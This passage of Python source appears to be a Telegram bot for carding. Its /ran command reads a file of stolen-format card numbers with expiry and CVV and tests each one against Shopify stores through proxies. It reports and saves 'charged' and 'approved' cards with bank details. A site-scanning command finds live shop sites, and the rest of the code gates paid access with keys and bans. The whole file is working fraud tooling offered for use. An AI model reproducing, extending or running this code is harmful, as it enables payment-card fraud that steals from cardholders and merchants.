        users_with_sites = len([uid for uid, sites in user_sites.items() if sites])

        stats_content += f"📈 Total Sites Added: {total_sites_count}\n"
        stats_content += f"👤 Users with Sites: {users_with_sites}\n"

        if user_sites:
            stats_content += f"\nSites per User:\n"
            for user_id, sites in user_sites.items():
                if sites:
                    stats_content += f"  User {user_id}: {len(sites)} sites\n"
                    for site in sites:
                        stats_content += f"    - {site}\n"

        stats_content += f"\n🔑 KEYS STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        total_keys = len(keys_data)
        used_keys = len([k for k, v in keys_data.items() if v.get('used', False)])
        unused_keys = total_keys - used_keys

        stats_content += f"🔢 Total Keys Generated: {total_keys}\n"
        stats_content += f"✅ Used Keys: {used_keys}\n"
        stats_content += f"⏳ Unused Keys: {unused_keys}\n"

        if keys_data:
            stats_content += f"\nKeys Details:\n"
            for key, key_data in keys_data.items():
                status = "USED" if key_data.get('used', False) else "UNUSED"
                used_by = key_data.get('used_by', 'N/A')
                days = key_data.get('days', 'N/A')
                created = key_data.get('created_at', 'N/A')
                used_at = key_data.get('used_at', 'N/A')

                stats_content += f"  Key: {key}\n"
                stats_content += f"    Status: {status}\n"
                stats_content += f"    Days Value: {days}\n"
                stats_content += f"    Created: {created}\n"
                if status == "USED":
                    stats_content += f"    Used By: {used_by}\n"
                    stats_content += f"    Used At: {used_at}\n"
                stats_content += "-" * 15 + "\n"

        stats_content += f"\n👑 ADMIN STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        stats_content += f"🛡️ Total Admins: {len(ADMIN_ID)}\n"
        stats_content += f"Admin IDs: {', '.join(map(str, ADMIN_ID))}\n"

        if os.path.exists(CC_FILE):
            try:
                async with aiofiles.open(CC_FILE, "r", encoding="utf-8") as f:
                    cc_content = await f.read()
                cc_lines = cc_content.strip().split('\n') if cc_content.strip() else []
                approved_cards = len([line for line in cc_lines if 'APPROVED' in line])
                charged_cards = len([line for line in cc_lines if 'CHARGED' in line])

                stats_content += f"\n💳 CARD STATISTICS\n"
                stats_content += "-" * 30 + "\n"
                stats_content += f"📊 Total Processed Cards: {len(cc_lines)}\n"
                stats_content += f"✅ Approved Cards: {approved_cards}\n"
                stats_content += f"💎 Charged Cards: {charged_cards}\n"
            except:
                pass

        stats_content += "\n" + "=" * 50 + "\n"
        stats_content += "📋 END OF REPORT 📋"

        stats_filename = f"bot_stats_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(stats_filename, "w", encoding="utf-8") as f:
            await f.write(stats_content)

        await event.reply("📊 𝘽𝙤𝙩 𝙨𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙘𝙨 𝙧𝙚𝙥𝙤𝙧𝙩 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙!", file=stats_filename)

        os.remove(stats_filename)

    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙞𝙣𝙜 𝙨𝙩𝙖𝙩𝙨: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]admins?$'))
async def show_admins(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())

    admins = await load_admins()
    admin_list = []

    for admin_id in admins:
        try:
            user = await client.get_entity(admin_id)
            name = f"{user.first_name or ''} {user.last_name or ''}".strip()
            username = f"@{user.username}" if user.username else "No username"
            status = "👑 **Owner**" if admin_id == OWNER_ID else "⭐ **Admin**"
            admin_list.append(f"{status}\n• ID: `{admin_id}`\n• Name: {name}\n• Username: {username}\n")
        except:
            admin_list.append(f"⭐ **Admin**\n• ID: `{admin_id}`\n• Name: Unknown\n")

    text = "┏━━━━━━ **Bot Administrators** ━━━━━━┓\n\n" + "\n".join(admin_list) + "\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\nFor serious issues contact @Dreadsync_2"
    await event.reply(text)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]ran$'))
async def ranfor(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("Join Group", "https://t.me/deebuchecked")]]
        return await event.reply("🚫 Unauthorized! Join group for free.", buttons=buttons)

    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ Proxy required! Use /addpxy first.")

    if not event.reply_to_msg_id:
        return await event.reply("Reply to .txt file with /ran")

    replied = await event.get_reply_message()
    if not replied.document or not replied.file.name.lower().endswith('.txt'):
        return await event.reply("Reply to a .txt file containing cards")

    file_path = await replied.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = await f.readlines()
        os.remove(file_path)
    except:
        return await event.reply("File read error.")

    # Extract only valid cards
    cards = [line.strip() for line in lines if re.match(r'^\d{16}\|\d{2}\|\d{2}\|\d{3,4}$', line.strip())]
    if not cards:
        return await event.reply("No valid cards found in file.")

    cc_limit = await get_cc_limit(access_type, event.sender_id)
    if len(cards) > cc_limit:
        cards = cards[:cc_limit]

    if not os.path.exists('sites.txt'):
        return await event.reply("sites.txt not found! Contact admin.")

    async with aiofiles.open('sites.txt', 'r') as f:
        sites = [line.strip() for line in await f.readlines() if line.strip()]

    if not sites:
        return await event.reply("No sites in sites.txt! Contact admin.")

    # Start processing with only hits
    asyncio.create_task(process_ranfor_cards(event, cards, sites))


async def process_ranfor_cards(event, cards, sites):
    status_msg = await event.reply(f"🔥 Cooking {len(cards)} cards... (Only Hits will be shown)")

    charged = 0
    approved = 0
    total_checked = 0

    for i, card in enumerate(cards, 1):
        if event.sender_id not in ACTIVE_MTXT_PROCESSES:  # allow stop if needed
            break

        site = random.choice(sites)
        try:
            result = await check_card_specific_site(card, site, event.sender_id)
            response_text = str(result.get("Response", "")).lower()

            is_hit = False

            if "charged" in response_text or "order completed" in response_text or "💎" in response_text:
                charged += 1
                status = "CHARGED 💎"
                is_hit = True
                await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))

            elif "approved" in response_text or "success" in response_text or "thank you" in response_text:
                approved += 1
                status = "APPROVED ✅"
                is_hit = True
                await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))

            total_checked += 1

            # ONLY SEND MESSAGE IF IT'S A HIT (Approved or Charged)
            if is_hit:
                brand, btype, level, bank, country, flag = await get_bin_info(card.split("|")[0][:6])
                msg = f"""
{status}
𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {result.get('Gateway', 'Shopify')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response', 'No response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {result.get('Price', '-')}
𝗦𝗶𝘁𝗲 ⇾ {site}
BIN: {brand} - {btype} - {level} | {bank} | {country} {flag}
"""
                await event.reply(msg)

        except Exception as e:
            pass  # silently ignore errors on declined cards

        # Update progress (shows only hits)
        await status_msg.edit(
            f"🔥 Running /ran...\n"
            f"Checked: {i}/{len(cards)}\n"
            f"💎 Charged: {charged}\n"
            f"✅ Approved: {approved}\n"
            f"⏳ Only Hits are being sent"
        )

        await asyncio.sleep(1.5)  # anti-flood

    # Final message
    await status_msg.edit(
        f"✅ /ran Finished!\n"
        f"Total Cards: {len(cards)}\n"
        f"💎 Charged: {charged}\n"
        f"✅ Approved: {approved}\n"
        f"Declined cards were hidden as requested."
    )
@client.on(events.CallbackQuery(pattern=rb"stop_ran:(\d+)"))
async def stop_ran_callback(event):
    try:
        process_user_id = int(event.pattern_match.group(1))
        if event.sender_id != process_user_id and not await is_admin(event.sender_id):
            return await event.answer("❌ Not your process!", alert=True)

        if process_user_id in ACTIVE_MTXT_PROCESSES:
            ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
            await event.answer("🛑 Stopped successfully!", alert=True)
        else:
            await event.answer("Already finished or not running.", alert=True)
    except:
        await event.answer("Error stopping process.", alert=True)

async def check_card_with_retries_ranfor(card, site, user_id, global_sites, max_retries=3):
    """Check a card with automatic retry up to max_retries times on site errors"""
    last_result = None
    
    for attempt in range(max_retries):
        result = await check_card_specific_site(card, site, user_id)
        
        # Check if site is dead
        if is_site_dead(result.get("Response", "")):
            # Don't remove sites from global_sites for /ran command
            # Just try with a new random site
            
            # If no more sites available, return dead
            if not global_sites:
                return {"Response": "All sites dead", "Price": "-", "Gateway": "Shopify", "Status": "Dead"}
            
            # Try with a new random site (without removing the dead one)
            site = random.choice(global_sites)
            last_result = result
            
            # Add a small delay before retry (except on last attempt)
            if attempt < max_retries - 1:
                await asyncio.sleep(0.5)
        else:
            # If no site error, return the result immediately
            return result
    
    # If all attempts failed with site errors, return as dead
    if last_result:
        return {"Response": f"Site errors on all attempts: {last_result.get('Response', 'Unknown')}", "Price": last_result.get('Price', '-'), "Gateway": "Shopify", "Status": "Dead"}
    
    # Fallback (should never reach here)
    return {"Response": "Max retries exceeded", "Price": "-", "Gateway": "Shopify", "Status": "Dead"}

@client.on(events.CallbackQuery(pattern=rb"stop_ranfor:(\d+)"))
async def stop_ranfor_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id: can_stop = True
        elif clicking_user_id in ADMIN_ID: can_stop = True
        if not can_stop: return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES: return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
    except Exception as e: await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]check'))
async def check_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned":
        return await event.reply("⛔ BANNED – Contact @Dreadsync_2 for appeal")

    if not can_access:
        return await event.reply(
            "🚫 ACCESS DENIED\nPrivate use = Premium only\nGroup use = Free",
            buttons=[[Button.url("JOIN GROUP – FREE CHECKS", "https://t.me/+pNplrRLrEGY5NTU0")]]
        )

    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply(
            "⚠️ PROXY REQUIRED\n"
            "Dead proxy = dead checks\n"
            "/addpxy ip:port:user:pass\n"
            "or /addpxy ip:port (no auth)"
        )

    check_text = event.raw_text[6:].strip()

    if not check_text:
        buttons = [[Button.inline("♻️ CHECK MY DB SITES", b"check_db_sites")]]
        return await event.reply(
            "🔪 SITE CHECKER\n\n"
            "Paste domains (one per line or space separated):\n"
            "`/check`\n"
            "site1.com\n"
            "https://shop2.myshopify.com\n"
            "test-store.com\n\n"
            "Or click below to scan your saved domains and auto-remove dead ones.",
            buttons=buttons
        )

    sites_to_check = extract_urls_from_text(check_text)

    if not sites_to_check:
        return await event.reply("❌ NO VALID DOMAINS DETECTED\n\nExample:\n`/check shop.com test.myshopify.com`")

    total = len(sites_to_check)
    if total > 10:
        sites_to_check = sites_to_check[:10]
        await event.reply(f"⚠️ {total} domains found – checking first 10 only (anti-ban)")

    asyncio.create_task(process_site_check(event, sites_to_check))


async def process_site_check(event, sites):
    total = len(sites)
    checked = 0
    live = []
    dead = []

    msg = await event.reply(
        f"🩸 SCANNING {total} SITES...\n"
        f"Live: 0 | Dead: 0 | Checked: 0/{total}"
    )

    batch_size = 8  # lower = safer
    for i in range(0, total, batch_size):
        batch = sites[i:i+batch_size]
        tasks = [test_single_site(site, user_id=event.sender_id) for site in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for site, result in zip(batch, results):
            checked += 1

            if isinstance(result, Exception):
                result = {"status": "dead", "response": str(result)[:80], "price": "-"}

            if result.get("status") == "proxy_dead":
                await msg.edit(
                    "☠️ PROXY DEAD – CHECK STOPPED\n"
                    "Dead proxy removed.\n"
                    f"Live: {len(live)} | Dead: {len(dead)} | Checked: {checked}/{total}\n"
                    "Add new proxy → /addpxy"
                )
                return

            if result["status"] == "working":
                live.append(result)
            else:
                dead.append(result)

            live_count = len(live)
            dead_count = len(dead)

            status_text = (
                f"🩸 SCANNING {total} SITES\n\n"
                f"✅ LIVE: {live_count}    ❌ DEAD: {dead_count}\n"
                f"PROGRESS: {checked}/{total}    {round((checked/total)*100)}%\n"
                f"Current: {site.split('//')[-1][:30]}...\n"
                f"Status: {result['status'].upper()}\n"
                f"Price: {result.get('price', '-')}"
            )

            if live:
                status_text += "\n\nLIVE:\n" + "\n".join(
                    f"→ {s['site']}  ${s['price']}" for s in live[-3:]  # show last 3 only
                )
            if dead:
                status_text += "\n\nDEAD:\n" + "\n".join(
                    f"→ {s['site']}  {s.get('response','')[:40]}" for s in dead[-2:]
                )

            try:
                await msg.edit(status_text)
            except:
                pass

            await asyncio.sleep(0.4)  # anti-flood

    # Final result – carder style
    final = f"""🩸 SCAN FINISHED

✅ LIVE: {len(live)}    ❌ DEAD: {len(dead)}    TOTAL: {total}

"""
    if live:
        final += "LIVE SITES:\n" + "\n".join(
            f"→ {s['site']}  ${s['price']}" for s in live
        ) + "\n\n"
    if dead:
        final += "DEAD SITES:\n" + "\n".join(
            f"→ {s['site']}  {s.get('response','dead')[:60]}" for s in dead
        )

    buttons = []
    if live:
        TEMP_WORKING_SITES[event.sender_id] = [s['site'] for s in live]
        buttons.append([Button.inline("💉 ADD LIVE TO DB", f"add_working:{event.sender_id}".encode())])

    try:
        await msg.edit(final, buttons=buttons)
    except:
        await event.reply(final, buttons=buttons)

# Button callback handlers
@client.on(events.CallbackQuery(data=b"check_db_sites"))
async def check_db_sites_callback(event):
    user_id = event.sender_id

    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])

    if not user_sites:
        return await event.answer("❌ 𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙨𝙞𝙩𝙚𝙨 𝙮𝙚𝙩!", alert=True)

    await event.answer("🔍 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜 𝘿𝘽 𝙨𝙞𝙩𝙚 𝙘𝙝𝙚𝙘𝙠...", alert=False)

    asyncio.create_task(process_db_site_check(event, user_sites))

async def process_db_site_check(event, user_sites):
    """Check user's DB sites and remove dead ones"""
    user_id = event.sender_id
    total_sites = len(user_sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_text = f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 {total_sites} 𝘿𝘽 𝙨𝙞𝙩𝙚𝙨...```"
    await event.edit(status_text)

    batch_size = 10
    for i in range(0, len(user_sites), batch_size):
        batch = user_sites[i:i+batch_size]
        tasks = []

        for site in batch:
            tasks.append(test_single_site(site, user_id=user_id))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            # Check if proxy is dead - stop checking and notify user
            if result["status"] == "proxy_dead":
                final_text = f"""⚠️ **𝙋𝙧𝙤𝙭𝙮 𝘿𝙚𝙖𝙙!**

{result['response']}

📊 **𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 𝘽𝙚𝙛𝙤𝙧𝙚 𝙎𝙩𝙤𝙥:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}
📝 𝘾𝙝𝙚𝙘𝙠𝙚𝙙: {checked}/{total_sites}"""
                try:
                    await event.edit(final_text)
                except:
                    pass
                return

            if result["status"] == "working":
                working_sites.append(site)
            else:
                dead_sites.append(site)

            working_count = len(working_sites)
            dead_count = len(dead_sites)

            status_text = f"""```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘿𝘽 𝙎𝙞𝙩𝙚𝙨...

📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{total_sites}]
✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}
❌ 𝘿𝙚𝙖𝙙: {dead_count}

🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {site}
📝 𝙎𝙩𝙖𝙩𝙪𝙨: {result['status'].upper()}```"""

            try:
                await event.edit(status_text)
            except:
                pass

            await asyncio.sleep(0.1)

    if dead_sites:
        sites_data = await load_json(SITE_FILE)
        sites_data[str(user_id)] = working_sites
        await save_json(SITE_FILE, sites_data)

    final_text = f"""✅ **𝘿𝘽 𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**

📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 (𝙍𝙚𝙢𝙤𝙫𝙚𝙙): {len(dead_sites)}

"""

    if working_sites:
        final_text += "✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site}`\n"
        final_text += "\n"

    if dead_sites:
        final_text += "❌ **𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 (𝙍𝙚𝙢𝙤𝙫𝙚𝙙):**\n"
        for idx, site in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site}`\n"

    try:
        await event.edit(final_text)
    except:
        pass

@client.on(events.CallbackQuery(pattern=rb"add_working:(\d+)"))
async def add_working_sites_callback(event):
    try:
        match = event.pattern_match
        callback_user_id = int(match.group(1).decode())

        if event.sender_id != callback_user_id:
            return await event.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙖𝙙𝙙 𝙨𝙞𝙩𝙚𝙨 𝙛𝙧𝙤𝙢 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙘𝙝𝙚𝙘𝙠!", alert=True)

        # Get working sites from temporary storage
        working_sites = TEMP_WORKING_SITES.get(callback_user_id, [])
        
        if not working_sites:
            return await event.answer("❌ 𝙉𝙤 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 𝙨𝙞𝙩𝙚𝙨 𝙛𝙤𝙪𝙣𝙙! 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙪𝙣 /𝙘𝙝𝙚𝙘𝙠 𝙖𝙜𝙖𝙞𝙣.", alert=True)

        sites_data = await load_json(SITE_FILE)
        user_sites = sites_data.get(str(callback_user_id), [])

        added_sites = []
        already_exists = []

        for site in working_sites:
            if site not in user_sites:
                user_sites.append(site)
                added_sites.append(site)
            else:
                already_exists.append(site)

        sites_data[str(callback_user_id)] = user_sites
        await save_json(SITE_FILE, sites_data)
        
        # Clear temporary storage after adding
        TEMP_WORKING_SITES.pop(callback_user_id, None)

        response_parts = []
        if added_sites:
            added_text = f"✅ **𝘼𝙙𝙙𝙚𝙙 {len(added_sites)} 𝙉𝙚𝙬 𝙎𝙞𝙩𝙚𝙨:**\n"
            for site in added_sites:
                added_text += f"• `{site}`\n"
            response_parts.append(added_text)

        if already_exists:
            exists_text = f"⚠️ **{len(already_exists)} 𝙎𝙞𝙩𝙚𝙨 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩:**\n"
            for site in already_exists:
                exists_text += f"• `{site}`\n"
            response_parts.append(exists_text)

        if response_parts:
            response_text = "\n".join(response_parts)
            response_text += f"\n📊 **𝙏𝙤𝙩𝙖𝙡 𝙎𝙞𝙩𝙚𝙨 𝙞𝙣 𝙔𝙤𝙪𝙧 𝘿𝘽:** {len(user_sites)}"
        else:
            response_text = "ℹ️ 𝘼𝙡𝙡 𝙨𝙞𝙩𝙚𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙞𝙣 𝙮𝙤𝙪𝙧 𝘿𝘽!"

        await event.answer("✅ 𝙎𝙞𝙩𝙚𝙨 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙!", alert=False)

        current_text = event.message.text
        updated_text = current_text + f"\n\n🔄 **𝙐𝙥𝙙𝙖𝙩𝙚:**\n{response_text}"

        try:
            await event.edit(updated_text, buttons=None)
        except:
            await event.respond(response_text)

    except Exception as e:
        await event.answer(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}", alert=True)

@client.on(events.NewMessage(pattern='/unauth'))
async def unauth_user(event):
    if not await is_admin(event.sender_id):
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /unauth {user_id}")

        user_id = int(parts[1])

        if not await is_premium_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙙𝙤𝙚𝙨 𝙣𝙤𝙩 𝙝𝙖𝙫𝙚 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!")

        success = await remove_premium_user(user_id)

        if success:
            await event.reply(f"✅ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙛𝙤𝙧 𝙪𝙨𝙚𝙧 {user_id}!")

            try:
                await client.send_message(user_id, f"⚠️ 𝙔𝙤𝙪𝙧 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨 𝙃𝙖𝙨 𝘽𝙚𝙚𝙣 𝙍𝙚𝙫𝙤𝙠𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙞𝙣𝙦𝙪𝙞𝙧𝙞𝙚𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @Dreadsync_2")
            except:
                pass
        else:
            await event.reply(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙧𝙚𝙢𝙤𝙫𝙚 𝙖𝙘𝙘𝙚𝙨𝙨 𝙛𝙤𝙧 𝙪𝙨𝙚𝙧 {user_id}")

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/ban'))
async def ban_user_command(event):
    if not await is_admin(event.sender_id):
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /ban {user_id}")

        user_id = int(parts[1])

        if await is_banned_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙖𝙣𝙣𝙚𝙙!")

        await remove_premium_user(user_id)
        await ban_user(user_id, event.sender_id)

        await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙗𝙖𝙣𝙣𝙚𝙙!")

        try:
            await client.send_message(user_id, f"🚫 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝘽𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙖𝙗𝙡𝙚 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙤𝙧 𝙜𝙧𝙤𝙪𝙥 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @Dreadsync_2")
        except:
            pass

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/unban'))
async def unban_user_command(event):
    if not await is_admin(event.sender_id):
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /unban {user_id}")

        user_id = int(parts[1])

        if not await is_banned_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙣𝙤𝙩 𝙗𝙖𝙣𝙣𝙚𝙙!")

        success = await unban_user(user_id)

        if success:
            await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙪𝙣𝙗𝙖𝙣𝙣𝙚𝙙!")

            try:
                await client.send_message(user_id, f"🎉 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝙐𝙣𝙗𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙖𝙜𝙖𝙞𝙣 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥𝙨.\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙮𝙤𝙪 𝙬𝙞𝙡𝙡 𝙣𝙚𝙚𝙙 𝙩𝙤 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖 𝙣𝙚𝙬 𝙠𝙚𝙮.")
            except:
                pass
        else:
            await event.reply(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙪𝙣𝙗𝙖𝙣 𝙪𝙨𝙚𝙧 {user_id}")

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]addprememoji\s+(\d+)'))
async def add_premium_emoji(event):
    if not await is_admin(event.sender_id):
        return await event.reply("Sirf admin add kar sakte hain premium emoji ID")
    
    new_id = event.pattern_match.group(1).strip()
    if not new_id.isdigit():
        return await event.reply("Sirf number daal (emoji file ID)")
    
    PREMIUM_EMOJI_IDS.append(new_id)
    await event.reply(f"✅ New premium emoji ID added: {new_id}\nAb har charged/live message mein random lagega")

async def initialize_files():
    for file in [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE, PROXY_FILE, ADMIN_FILE]:
        await create_json_file(file)
    
    # Initialize admin file with owner
    admins = await load_admins()
    await save_admins(admins)

async def main():
    await initialize_files()
    admins = await load_admins()
    await save_admins(admins)

    print("✅ Files initialized")
    print("👑 Owner set as Admin")
    print("🔥 𝘽𝙊𝙏 𝙍𝙐𝙉𝙉𝙄𝙉𝙂 💨")

    await client.start(bot_token=BOT_TOKEN)
    print("✅ Bot connected successfully!")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
